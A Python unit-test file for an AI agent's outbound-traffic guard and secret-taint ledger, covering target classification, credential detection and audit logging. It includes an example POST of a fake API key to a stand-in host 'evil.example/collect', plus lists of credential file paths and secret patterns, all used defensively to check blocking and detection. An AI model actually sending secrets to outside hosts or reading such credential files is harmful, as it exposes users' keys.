"""TASK-S4-02 出域决策与链路监测单元测试（P7.1-20 / §5.7 机制 4 / §2.5）

覆盖：目标内外部归类 / data_class 三条证据合并 / decide_egress 判定 /
执行点 BlockResult 成形 / 污点台账（作用域、TTL、脱敏）/ 敏感文件与凭据识别 /
复用既有检测器的深扫开关。
"""
from __future__ import annotations

import json

import pytest

from policy_testkit import isolate_policy, make_policy, make_store

from agent.guardrails.egress_guard import (
    ASK_ERROR_PREFIX,
    BLOCKED_ERROR_PREFIX,
    ENV_EGRESS_GUARD,
    EgressBlocked,
    EgressGuard,
)
from agent.policy.egress import (
    DEFAULT_EGRESS_CAPABILITY,
    EgressRequest,
    build_egress_context,
    classify_target,
    decide_egress,
)
from agent.policy.engine import DecisionObserver, PolicyEngine
from agent.policy.models import EFFECT_ALLOW, EFFECT_ASK, EFFECT_DENY
from agent.policy.taint import (
    ENV_TAINT_DEEP_SCAN,
    ENV_TAINT_ENABLED,
    ENV_TAINT_TTL,
    PROCESS_SCOPE,
    SecretTaintLedger,
    describe_kinds,
    flatten_for_scan,
    get_secret_taint,
    is_secret_path,
    mark_secret_read,
    observe_file_read,
    reset_secret_taint,
    scan_payload,
    scan_secret_material,
    taint_state,
)

# 一条 OpenAI 形态的假密钥（**仅用于用例**，不是真凭据）
FAKE_KEY = "sk-" + "A1b2C3d4E5f6G7h8I9j0K1l2"
FAKE_AWS = "AKIA" + "ABCDEFGHIJKLMNOP"
FAKE_PEM = "-----BEGIN RSA PRIVATE KEY-----\nMIIEow==\n"


@pytest.fixture(autouse=True)
def _iso(tmp_path, monkeypatch):
    return isolate_policy(tmp_path, monkeypatch)


def _engine(policies=(), **kwargs):
    kwargs.setdefault("cache_size", 0)
    kwargs.setdefault("decision_log", False)
    kwargs.setdefault("observer", DecisionObserver(enabled=False))
    kwargs.setdefault("inbox", False)
    return PolicyEngine(make_store(list(policies)), **kwargs)


# ════════════════════════════════════════════════════════════
#  目标归类
# ════════════════════════════════════════════════════════════


class TestClassifyTarget:
    @pytest.mark.parametrize("url,expected", [
        ("https://api.openai.com/v1/chat", True),
        ("http://example.com", True),
        ("http://127.0.0.1:8000/x", False),
        ("http://localhost/x", False),
        ("http://10.1.2.3/x", False),
        ("http://192.168.1.10/x", False),
        ("http://172.16.5.5/x", False),
        ("http://169.254.1.1/x", False),
        ("http://[::1]/x", False),
        ("http://fileserver.internal/x", False),
        ("http://nas.local/x", False),
        ("http://public-host.example/x", True),
    ])
    def test_内外部归类(self, url, expected):
        assert classify_target(url)["external"] is expected

    def test_解析字段(self):
        target = classify_target("https://api.example.com:8443/v1/x?y=1")
        assert target["scheme"] == "https"
        assert target["host"] == "api.example.com"
        assert target["port"] == 8443
        assert target["path"] == "/v1/x"

    def test_无法解析按外部处理(self):
        target = classify_target("http://[bad")
        assert target["external"] is True

    def test_空主机按外部处理(self):
        assert classify_target("https:///path")["external"] is True

    def test_端口非法不崩(self):
        assert classify_target("http://h:abc/")["port"] is None


# ════════════════════════════════════════════════════════════
#  data_class 证据合并
# ════════════════════════════════════════════════════════════


class TestDataClassEvidence:
    def test_显式声明(self):
        ctx, evidence = build_egress_context(EgressRequest(
            url="https://api.example.com/x", data_class="secret"))
        assert energy_class(ctx) == "secret"
        assert evidence["data_class_source"] == "declared"

    def test_载荷含凭据即视为_secret(self):
        req = EgressRequest(url="https://api.example.com/x", method="POST",
                            payload={"json": {"api_key": FAKE_KEY}})
        ctx, evidence = build_egress_context(req)
        assert energy_class(ctx) == "secret"
        assert evidence["data_class_source"] == "payload_material"
        assert "openai_key" in evidence["secret_kinds"]

    def test_链路污点即视为_secret(self):
        mark_secret_read("C:/Users/x/.ssh/id_rsa", kind="file",
                         content_kinds=["openssh_private_key"])
        ctx, evidence = build_egress_context(EgressRequest(
            url="https://api.example.com/x"))
        assert energy_class(ctx) == "secret"
        assert evidence["data_class_source"] == "read_then_egress"
        assert evidence["read_then_egress"] is True

    def test_三条证据都不指向_secret_时保持未分级(self):
        ctx, evidence = build_egress_context(EgressRequest(
            url="https://api.example.com/x", payload={"json": {"q": "hello"}}))
        assert energy_class(ctx) is None
        assert evidence["data_class"] == ""
        assert evidence["secret_kinds"] == []

    def test_证据不落原始载荷(self):
        req = EgressRequest(url="https://api.example.com/x",
                            payload={"json": {"api_key": FAKE_KEY}})
        ctx, evidence = build_egress_context(req)
        blob = json.dumps({"ctx": ctx.input, "evidence": evidence}, ensure_ascii=False)
        assert FAKE_KEY not in blob
        assert "values_recorded" in blob

    def test_attributes_只放派生证据(self):
        ctx, _ = build_egress_context(EgressRequest(
            url="https://api.example.com/x", method="POST",
            payload={"data": "x" * 50}, header_names=("Authorization", "Accept")))
        attrs = ctx.get("attributes")
        assert attrs["method"] == "POST"
        assert attrs["has_authorization_header"] is True
        assert attrs["payload_bytes"] > 0
        assert "x" * 50 not in json.dumps(attrs)

    def test_target_由_url_推导(self):
        ctx, _ = build_egress_context(EgressRequest(url="https://api.example.com/x"))
        assert ctx.get("target.external") is True
        assert ctx.get("capability.origin.external_endpoint") is True

    def test_缺省_capability_id(self):
        ctx, _ = build_egress_context(EgressRequest(url="https://example.com"))
        assert ctx.capability_id == DEFAULT_EGRESS_CAPABILITY


def energy_class(ctx):
    """读回合并后的 data_class（`""`/None ⇒ 未分级）"""
    return ctx.get("capability.trust.data_class")


# ════════════════════════════════════════════════════════════
#  decide_egress
# ════════════════════════════════════════════════════════════


class TestDecideEgress:
    def test_干净外发放行且未覆盖(self):
        decision = decide_egress(EgressRequest(url="https://example.com",
                                                payload={"data": "hello"}),
                                  engine=_engine())
        assert decision.allowed is True
        assert decision.matched is False  # 策略层无覆盖 ⇒ 按既有网络策略放行
        assert decision.effect == EFFECT_ALLOW

    def test_secret_出域拒绝_决策层(self):
        decision = decide_egress(EgressRequest(
            url="https://api.example.com/x", data_class="secret"), engine=_engine())
        assert decision.allowed is False
        assert decision.effect == EFFECT_DENY
        assert decision.policy_id.startswith("builtin.invariant.")
        assert decision.matched is True

    def test_secret_内部目标不拒绝(self):
        decision = decide_egress(EgressRequest(
            url="http://127.0.0.1:8000/x", data_class="secret"), engine=_engine())
        assert decision.allowed is True

    def test_载荷凭据拒绝(self):
        decision = decide_egress(EgressRequest(
            url="https://evil.example/collect", method="POST",
            payload={"json": {"k": FAKE_KEY}}), engine=_engine())
        assert decision.allowed is False
        assert "openai_key" in decision.evidence["secret_kinds"]

    def test_ask_策略不算放行且需人工(self):
        engine = _engine([make_policy(
            id="ask.egress", effect="ask",
            match={"field": "target.external", "op": "eq", "value": True})])
        decision = decide_egress(EgressRequest(url="https://example.com"),
                                 engine=engine)
        assert decision.allowed is False
        assert decision.effect == EFFECT_ASK
        assert decision.needs_human is True
        assert decision.policy_id == "ask.egress"

    def test_to_dict_可序列化(self):
        decision = decide_egress(EgressRequest(
            url="https://api.example.com/x", data_class="secret"), engine=_engine())
        body = decision.to_dict()
        assert json.dumps(body, ensure_ascii=False)
        assert body["allowed"] is False and body["evidence"]


# ════════════════════════════════════════════════════════════
#  执行点（guardrails/egress_guard）
# ════════════════════════════════════════════════════════════


class TestEgressGuard:
    def test_放行返回可审计的决策(self):
        decision = EgressGuard.precheck(method="GET", url="https://example.com")
        assert decision is not None
        assert decision.allowed is True
        assert decision.matched is False  # 策略层无覆盖
        assert decision.effect == EFFECT_ALLOW

    def test_未启用返回_None(self, monkeypatch):
        monkeypatch.setenv(ENV_EGRESS_GUARD, "0")
        assert EgressGuard.precheck(method="GET", url="https://example.com") is None

    def test_拒绝返回决策(self):
        decision = EgressGuard.precheck(
            method="POST", url="https://api.example.com/x", data=FAKE_KEY)
        assert decision is not None and decision.allowed is False

    def test_enforce_抛_EgressBlocked(self):
        with pytest.raises(EgressBlocked) as exc:
            EgressGuard.enforce(method="POST", url="https://api.example.com/x",
                                data=FAKE_KEY)
        assert isinstance(exc.value.decision, object)
        assert BLOCKED_ERROR_PREFIX in str(exc.value)

    def test_enforce_放行不抛(self):
        EgressGuard.enforce(method="GET", url="https://example.com")

    def test_block_result_与_error_result_同形(self):
        decision = EgressGuard.precheck(method="POST", url="https://a.example/x",
                                        data=FAKE_KEY)
        result = EgressGuard.block_result(decision, "https://a.example/x")
        for key in ("ok", "status_code", "headers", "content", "text",
                    "content_length", "url", "elapsed", "error"):
            assert key in result
        assert result["ok"] is False and result["blocked"] is True
        assert result["blocked_by"] == "policy.egress"
        assert result["policy_id"].startswith("builtin.invariant.")

    def test_错误文案不含载荷(self):
        decision = EgressGuard.precheck(method="POST", url="https://a.example/x",
                                        data=FAKE_KEY)
        text = EgressGuard.blocked_error(decision)
        assert FAKE_KEY not in text
        assert "a.example" in text

    def test_ask_文案前缀不同(self):
        engine = _engine([make_policy(
            id="ask2.egress", effect="ask",
            match={"field": "target.external", "op": "eq", "value": True})])
        decision = EgressGuard.precheck(method="GET", url="https://x.example/",
                                        engine=engine)
        assert ASK_ERROR_PREFIX in EgressGuard.blocked_error(decision)

    def test_开关关闭即放行(self, monkeypatch):
        monkeypatch.setenv(ENV_EGRESS_GUARD, "0")
        assert EgressGuard.precheck(method="POST", url="https://api.example.com/x",
                                    data=FAKE_KEY) is None

    def test_决策层异常_失败开放(self, monkeypatch):
        """通用硬约束 1：新增机制失败不得阻断主流程（但真实 deny 绝不 fail-open）。"""
        import agent.policy.egress as egress_mod

        def boom(*args, **kwargs):
            raise RuntimeError("policy layer down")

        monkeypatch.setattr(egress_mod, "decide_egress", boom)
        assert EgressGuard.precheck(method="GET", url="https://example.com") is None

    def test_拦截写入审计_egress_blocked(self, tmp_path):
        """拦截留痕入链：`egress.blocked`（与决策侧 `policy.decision` 分开）

        隔离口径同 `test_policy_engine.py::test_决策写入链式审计`：断言只针对
        **自有链**，避免与同 worker 内其它写者抢进程级门面。
        """
        from agent.audit import facade as facade_mod
        from agent.audit.chain import AuditChain, reset_audit_chains

        reset_audit_chains()
        chain = AuditChain(str(tmp_path / "egress_audit.db"),
                           roots_path=str(tmp_path / "roots.jsonl"),
                           signing_key_path=str(tmp_path / "k.pem"),
                           auto_seal=False)
        previous = facade_mod.audit.bind(chain)
        old_enabled = facade_mod.audit.enabled
        facade_mod.audit.enabled = True
        try:
            decision = EgressGuard.precheck(
                method="POST", url="https://api.example.com/x", data=FAKE_KEY)
            assert decision is not None and decision.allowed is False
            blocked = chain.entries(action="egress.blocked")
        finally:
            facade_mod.audit.bind(previous)
            facade_mod.audit.enabled = old_enabled
            chain.close(timeout=2.0)
            reset_audit_chains()
        assert len(blocked) == 1
        # 审计门面把业务字段包在 payload.payload 下（外层还有 actor_source/schema）
        entry = blocked[0].payload or {}
        fields = entry.get("payload") if isinstance(entry.get("payload"), dict) else entry
        # 执行点留痕必须写明「网络动作未发生」——这是决策-执行分离的可核对证据
        assert fields.get("network_action_taken") is False
        assert fields.get("enforced") is True
        assert str(fields.get("policy_id", "")).startswith("builtin.invariant.")
        assert fields.get("data_class") == "secret"

    def test_header_names_接受_dict_与序列(self):
        assert EgressGuard.precheck(method="GET", url="https://example.com",
                                    headers={"X-A": "1"}).allowed is True
        assert EgressGuard.precheck(method="GET", url="https://example.com",
                                    headers=[("X-A", "1")]).allowed is True


# ════════════════════════════════════════════════════════════
#  污点台账
# ════════════════════════════════════════════════════════════


class TestSecretDetection:
    @pytest.mark.parametrize("text,kind", [
        (FAKE_KEY, "openai_key"),
        (FAKE_AWS, "aws_access_key"),
        (FAKE_PEM, "private_key_block"),
        ("ghp_" + "a" * 30, "github_token"),
        ("Bearer " + "a" * 30, "bearer_header"),
        ("api_key = '" + "a" * 24 + "'", "assigned_credential"),
    ])
    def test_凭据形态识别(self, text, kind):
        assert kind in scan_secret_material(text)

    @pytest.mark.parametrize("text", [
        "", "hello world", "no secrets here", "token: short",
        "见 docs/secret_rotation_plan.md",
    ])
    def test_普通文本不误报(self, text):
        assert scan_secret_material(text) == []

    def test_只返回类别不返回值(self):
        kinds = scan_secret_material(f"key={FAKE_KEY}")
        assert isinstance(kinds, list)
        assert all(FAKE_KEY not in str(k) for k in kinds)

    def test_超长文本截断(self):
        assert scan_secret_material("a" * 10_000_000) == []

    def test_scan_payload_拍平结构(self):
        assert "openai_key" in scan_payload({"a": {"b": [FAKE_KEY]}})
        assert scan_payload(b"plain bytes") == []

    def test_flatten_for_scan_深度上限(self):
        deep = {"a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": FAKE_KEY}}}}}}}}}
        assert scan_secret_material(flatten_for_scan(deep)) == []

    def test_describe_kinds_脱敏(self):
        body = describe_kinds(["openai_key", "openai_key", "aws_access_key"])
        assert body == {"kinds": ["aws_access_key", "openai_key"], "count": 2,
                        "values_recorded": False}

    @pytest.mark.parametrize("path,expected", [
        ("/home/u/.env", True),
        ("C:/Users/u/.ssh/id_rsa", True),
        ("/etc/ssl/server.pem", True),
        ("data/api_keys.json", True),
        ("config/credentials.json", True),
        ("data/network_config.json", True),
        ("README.md", False),
        ("docs/secret_rotation_plan.md", False),
        ("agent/policy/models.py", False),
        ("", False),
    ])
    def test_敏感路径窄口径(self, path, expected):
        assert is_secret_path(path) is expected

    def test_深扫默认关闭(self, monkeypatch):
        assert scan_secret_material("contact a@b.com") == []

    def test_深扫可开启且只取_CRITICAL(self, monkeypatch):
        monkeypatch.setenv(ENV_TAINT_DEEP_SCAN, "1")
        try:
            import agent.utils.sensitive_data_filter  # noqa: F401
        except Exception:  # noqa: BLE001 既有检测器不在 ⇒ 跳过（不掩盖失败）
            pytest.skip("既有 PII 检测器不可用")
        # 普通邮箱不应被 CRITICAL 级收进来
        assert scan_secret_material("mail a@b.com") == []


class TestTaintLedger:
    def test_登记与查询(self):
        ledger = SecretTaintLedger()
        ledger.mark(kind="file", source_ref="/x/.env", scope="s1",
                    kinds=["openai_key"])
        assert ledger.is_tainted(trace_id="s1") is True
        assert ledger.is_tainted(trace_id="s2") is False

    def test_进程级回退(self):
        ledger = SecretTaintLedger()
        ledger.mark(kind="file", source_ref="/x/.env", kinds=["openai_key"])
        assert ledger.is_tainted() is True
        assert ledger.is_tainted(trace_id="anything") is True

    def test_subject_作用域(self):
        ledger = SecretTaintLedger()
        ledger.mark(source_ref="/x", scope="subject-1", kinds=["openai_key"])
        assert ledger.is_tainted(subject_id="subject-1") is True
        assert ledger.is_tainted(subject_id="subject-2") is False

    def test_trace_优先于_subject(self):
        ledger = SecretTaintLedger()
        assert ledger.scope_for(trace_id="t", subject_id="s") == "t"
        assert ledger.scope_for(subject_id="s") == "s"
        assert ledger.scope_for() == PROCESS_SCOPE

    def test_清理指定作用域(self):
        ledger = SecretTaintLedger()
        ledger.mark(source_ref="/x", scope="s1", kinds=["openai_key"])
        ledger.mark(source_ref="/y", scope="s2", kinds=["openai_key"])
        assert ledger.clear(scope="s1") == 1
        assert ledger.is_tainted(trace_id="s1") is False
        assert ledger.is_tainted(trace_id="s2") is True

    def test_全清(self):
        ledger = SecretTaintLedger()
        ledger.mark(source_ref="/x", kinds=["openai_key"])
        assert ledger.clear() == 1
        assert ledger.is_tainted() is False

    def test_过期即失效(self):
        ledger = SecretTaintLedger(ttl_seconds=1)
        ledger.mark(source_ref="/x", kinds=["openai_key"])
        mark = ledger.marks_for()[0]
        object.__setattr__(mark, "expires_at", "2000-01-01T00:00:00+08:00")
        assert ledger.is_tainted() is False
        assert ledger.marks_for() == []

    def test_关闭时不登记(self):
        ledger = SecretTaintLedger(enabled=False)
        assert ledger.mark(source_ref="/x", kinds=["openai_key"]) is None
        assert ledger.is_tainted() is False

    def test_统计(self):
        ledger = SecretTaintLedger()
        ledger.mark(source_ref="/x", kinds=["openai_key"])
        ledger.is_tainted()
        stats = ledger.stats
        assert stats["marks"] == 1 and stats["marked_count"] == 1
        assert stats["hit_count"] == 1

    def test_taint_kinds_去重(self):
        ledger = SecretTaintLedger()
        ledger.mark(source_ref="/x", kinds=["openai_key", "aws_access_key"])
        ledger.mark(source_ref="/y", kinds=["openai_key"])
        assert ledger.taint_kinds() == ["aws_access_key", "openai_key"]

    def test_mark_audit_leaves_无完整路径(self):
        ledger = SecretTaintLedger()
        mark = ledger.mark(kind="file", source_ref="C:/Users/u/.ssh/id_rsa",
                           kinds=["openssh_private_key"])
        leaves = mark.audit_leaves()
        assert leaves["source_name"] == "id_rsa"
        assert "C:/Users" not in json.dumps(leaves)
        assert leaves["values_recorded"] is False


class TestTaintFacade:
    def test_未启用时返回_None(self, monkeypatch):
        monkeypatch.setenv(ENV_TAINT_ENABLED, "0")
        reset_secret_taint()
        assert mark_secret_read("/x/.env", content=FAKE_KEY) is None

    def test_无凭据内容不登记(self):
        assert mark_secret_read("/x/.env", content="PORT=8080") is None

    def test_observe_file_read_窄口径(self):
        # 路径非敏感载体 ⇒ 不登记（即使内容像凭据）
        assert observe_file_read("notes.txt", f"key={FAKE_KEY}") is None
        # 路径敏感但内容普通 ⇒ 不登记
        assert observe_file_read("/home/u/.env", "PORT=8080") is None
        # 两者都成立才登记
        mark = observe_file_read("/home/u/.env", f"KEY={FAKE_KEY}")
        assert mark is not None and "openai_key" in mark.kinds

    def test_observe_file_read_不抛异常(self):
        assert observe_file_read(None, object()) is None

    def test_taint_state_脱敏摘要(self):
        mark_secret_read("/x/id_rsa", content_kinds=["openssh_private_key"])
        state = taint_state()
        assert state["tainted"] is True
        assert state["kinds"] == ["openssh_private_key"]
        assert "values_recorded" not in json.dumps(state)

    def test_台账单例可重置(self):
        first = get_secret_taint()
        reset_secret_taint()
        assert get_secret_taint() is not first

    def test_ttl_可由环境变量配置(self, monkeypatch):
        monkeypatch.setenv(ENV_TAINT_TTL, "120")
        assert SecretTaintLedger().ttl_seconds == 120
        monkeypatch.setenv(ENV_TAINT_TTL, "abc")
        assert SecretTaintLedger().ttl_seconds == 900  # 非法值回退默认
